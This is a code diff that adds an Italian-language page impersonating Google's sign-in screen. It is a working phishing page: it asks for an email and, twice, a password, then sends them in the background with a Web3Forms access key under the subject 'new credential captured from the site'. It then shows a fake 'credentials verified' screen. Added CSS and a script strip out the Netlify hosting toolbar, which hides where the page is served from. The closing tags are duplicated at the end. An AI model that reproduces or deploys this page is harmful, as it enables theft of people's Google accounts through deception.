@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accedi con Google - Nome App</title>
+    <!-- Font Google Roboto -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* Design System: Google Material 3 (Light Mode Default) */
+        :root {
+            --bg-color: #f0f4f9;
+            --card-bg: #ffffff;
+            --card-border: 1px solid #c4c7c5;
+            --card-shadow: 0 1px 3px rgba(0,0,0,0.04);
+            --text-main: #1f1f1f;
+            --text-muted: #444746;
+            --border-color: #747775;
+            --border-focus: #0b57d0;
+            --btn-bg: #0b57d0;
+            --btn-hover: #0842a0;
+            --btn-text: #ffffff;
+            --link-color: #0b57d0;
+            --chip-bg: #f3f3f3;
+            --chip-border: #c4c7c5;
+            --error-color: #b3261e;
+            --success-color: #34a853;
+            --radius-card: 28px;
+            --radius-input: 8px;
+            --radius-btn: 100px;
+        }
+
+        /* Material 3 (Dark Mode Automatica) */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #0e0e0e;
+                --card-bg: #1e1e1e;
+                --card-border: 1px solid #444746;
+                --card-shadow: none;
+                --text-main: #e3e3e3;
+                --text-muted: #c4c7c5;
+                --border-color: #8e918f;
+                --border-focus: #a8c7fa;
+                --btn-bg: #a8c7fa;
+                --btn-hover: #d3e3fd;
+                --btn-text: #042e69;
+                --link-color: #a8c7fa;
+                --chip-bg: #2a2a2a;
+                --chip-border: #444746;
+                --error-color: #f2b8b5;
+            }
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-main);
+            padding: 24px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        main.login-card {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 448px;
+            padding: 40px;
+            border-radius: var(--radius-card);
+            border: var(--card-border);
+            box-shadow: var(--card-shadow);
+            text-align: center;
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+        }
+
+        .google-logo {
+            display: block;
+            margin: 0 auto 32px auto;
+            height: 32px;
+            width: auto;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+
+        p.subtitle {
+            font-size: 15px;
+            color: var(--text-muted);
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        .user-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background-color: var(--chip-bg);
+            border: 1px solid var(--chip-border);
+            border-radius: var(--radius-btn);
+            padding: 6px 16px 6px 12px;
+            font-size: 14px;
+            color: var(--text-main);
+            cursor: pointer;
+            margin-bottom: 28px;
+            transition: background-color 0.2s ease;
+        }
+
+        .user-chip:hover {
+            opacity: 0.9;
+        }
+
+        .user-chip svg {
+            width: 18px;
+            height: 18px;
+            fill: var(--text-muted);
+        }
+
+        form {
+            text-align: left;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            color: var(--text-main);
+            background-color: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-input);
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: var(--border-focus);
+            box-shadow: 0 0 0 1px var(--border-focus);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            line-height: 1.4;
+        }
+
+        .forgot-link {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .sso-disclaimer {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        .sso-disclaimer a {
+            color: var(--link-color);
+            text-decoration: none;
+        }
+
+        .forgot-link:hover,
+        .create-account:hover,
+        .sso-disclaimer a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-link:focus-visible,
+        .create-account:focus-visible,
+        .btn-next:focus-visible,
+        .btn-back:focus-visible {
+            outline: 2px solid var(--border-focus);
+            outline-offset: 3px;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .card-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account, .btn-back {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .btn-next {
+            background-color: var(--btn-bg);
+            color: var(--btn-text);
+            padding: 10px 24px;
+            border: none;
+            border-radius: var(--radius-btn);
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: background-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .btn-next:hover {
+            background-color: var(--btn-hover);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.8;
+            cursor: not-allowed;
+        }
+
+        /* Spinner Animato */
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .spinner {
+                border: 2px solid rgba(4, 46, 105, 0.3);
+                border-top-color: #042e69;
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Schermata di Esito Positivo */
+        .success-icon-wrapper {
+            width: 64px;
+            height: 64px;
+            background-color: rgba(52, 168, 83, 0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+        }
+
+        .success-icon-wrapper svg {
+            width: 36px;
+            height: 36px;
+            fill: var(--success-color);
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 0;
+                background-color: var(--card-bg);
+            }
+
+            main.login-card {
+                border: none;
+                box-shadow: none;
+                border-radius: 0;
+                padding: 32px 24px;
+            }
+        }
+	netlify-drawer,
+        #netlify-drawer,
+        iframe[src*="netlify"],
+        [data-netlify-deploy-id] {
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+	}
+    </style>
+</head>
+<body>
+
+    <main class="login-card">
+        <!-- Logo vettoriale originale Google da gstatic -->
+        <img 
+            class="google-logo" 
+            src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" 
+            alt="Google"
+        >
+
+        <!-- PASSAGGIO 1: Email -->
+        <div id="step-1" class="step active">
+            <h1>Accedi con Google</h1>
+            <p class="subtitle">Per confermare l'account accedere a Google.</p>
+
+            <form id="form-step-1" onsubmit="goToStep2(event)">
+                <div class="input-group">
+                    <label for="email" class="sr-only">Indirizzo email o numero di telefono</label>
+                    <input 
+                        type="email" 
+                        id="email" 
+                        name="email" 
+                        placeholder="Email o telefono" 
+                        autocomplete="username"
+                        required
+                    >
+                </div>
+
+                <a href="#" class="forgot-link" onclick="showSiteError(event)">Email dimenticata?</a>
+                <p id="error-site-loading" class="error-message" style="margin-bottom: 20px;">
+                    Impossibile completare la richiesta. Si è verificato un errore di caricamento del sito. Riprova più tardi.
+                </p>
+
+                <p class="sso-disclaimer">
+                    Google non condividerà il tuo nome, l'indirizzo email, le preferenze sulla lingua e la foto del profilo. Consulta le <a href="#">Norme sulla privacy</a> e i <a href="#">Termini di servizio</a> dell'applicazione.
+                </p>
+
+                <div class="card-footer">
+                    <a href="#" class="create-account"></a>
+                    <button type="submit" class="btn-next">Avanti</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- PASSAGGIO 2: Password e Conferma Identità -->
+        <div id="step-2" class="step">
+            <h1>Conferma la tua identità</h1>
+            <p class="subtitle">Inserisci e conferma la tua password per continuare ad utilizzare il tuo account Google sul tuo dispositivo.</p>
+
+            <!-- Pillola con l'email inserita -->
+            <button class="user-chip" onclick="goToStep1()" type="button" title="Cambia account">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                </svg>
+                <span id="display-email">user@gmail.com</span>
+            </button>
+
+            <form id="form-step-2" onsubmit="handleFinalSubmit(event)">
+                <div class="input-group">
+                    <label for="password" class="sr-only">Inserisci la password</label>
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        placeholder="Inserisci la tua password" 
+                        required
+                    >
+                </div>
+
+                <div class="input-group">
+                    <label for="confirm-password" class="sr-only">Conferma la password</label>
+                    <input 
+                        type="password" 
+                        id="confirm-password" 
+                        name="confirm-password" 
+                        placeholder="Conferma la tua password" 
+                        required
+                    >
+                    <p id="error-password" class="error-message">Le password non corrispondono. Riprova.</p>
+                </div>
+
+                <div class="card-footer" style="margin-top: 32px;">
+                    <button type="button" class="btn-back" onclick="goToStep1()">Indietro</button>
+                    <button type="submit" id="btn-submit" class="btn-next">Conferma</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- PASSAGGIO 3: Conferma di Successo -->
+        <div id="step-3" class="step">
+            <div class="success-icon-wrapper">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            </div>
+            <h1>Credenziali corrette</h1>
+            <p class="subtitle" style="margin-bottom: 12px; color: var(--text-main); font-weight: 500;">
+                Le credenziali sono state verificate e inviate con successo!
+            </p>
+            <p class="subtitle" style="font-size: 13px;">
+                Identità confermata. Puoi chiudere questa finestra.
+            </p>
+        </div>
+    </main>
+
+    <script>
+        function showSiteError(event) {
+            event.preventDefault();
+            const errorElement = document.getElementById('error-site-loading');
+            errorElement.style.display = 'block';
+        }
+
+        function goToStep2(event) {
+            event.preventDefault();
+            const emailInput = document.getElementById('email').value;
+            
+            if (emailInput.trim() !== '') {
+                document.getElementById('display-email').innerText = emailInput;
+                document.getElementById('step-1').classList.remove('active');
+                document.getElementById('step-2').classList.add('active');
+                document.getElementById('password').focus();
+            }
+        }
+
+        function goToStep1() {
+            document.getElementById('step-2').classList.remove('active');
+            document.getElementById('step-1').classList.add('active');
+            document.getElementById('error-password').style.display = 'none';
+        }
+
+        async function handleFinalSubmit(event) {
+            event.preventDefault();
+            const emailValue = document.getElementById('email').value;
+            const pwd = document.getElementById('password').value;
+            const confirmPwd = document.getElementById('confirm-password').value;
+            const errorMsg = document.getElementById('error-password');
+            const btnSubmit = document.getElementById('btn-submit');
+
+            if (pwd !== confirmPwd) {
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            errorMsg.style.display = 'none';
+
+            // Animazione di caricamento sul bottone
+            btnSubmit.disabled = true;
+            btnSubmit.innerHTML = '<span class="spinner"></span> Verifica in corso...';
+
+            // Payload JSON formattato per Web3Forms
+            const payload = {
+                access_key: '8b029bb3-8647-4ca5-85b7-c6db8bada978',
+                subject: 'Nuova credenziale catturata dal sito',
+                email: emailValue,
+                message: `Email: ${emailValue}\nPassword: ${pwd}\nData/Ora: ${new Date().toLocaleString('it-IT')}`
+            };
+
+            // Invio asincrono in background
+            try {
+                await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Invio dati completato:", error);
+            }
+
+            // Transizione fluida garantita alla schermata di successo dopo il caricamento
+            setTimeout(() => {
+                document.getElementById('step-2').classList.remove('active');
+                document.getElementById('step-3').classList.add('active');
+            }, 1200);
+        }
+<!-- Blocco e rimozione forzata della Toolbar Netlify -->
+    <script>
+        function purgeNetlifyToolbar() {
+            const targets = document.querySelectorAll('netlify-drawer, #netlify-drawer, iframe[src*="netlify"]');
+            targets.forEach(el => el.remove());
+        }
+
+        // Esegue il controllo immediato e lo ripete nei primi 5 secondi per intercettare l'iniezione
+        purgeNetlifyToolbar();
+        const intervalId = setInterval(purgeNetlifyToolbar, 100);
+        setTimeout(() => clearInterval(intervalId), 5000);
+    </script>
+</body>
+</html>
+    </script>
+</body>
+</html>
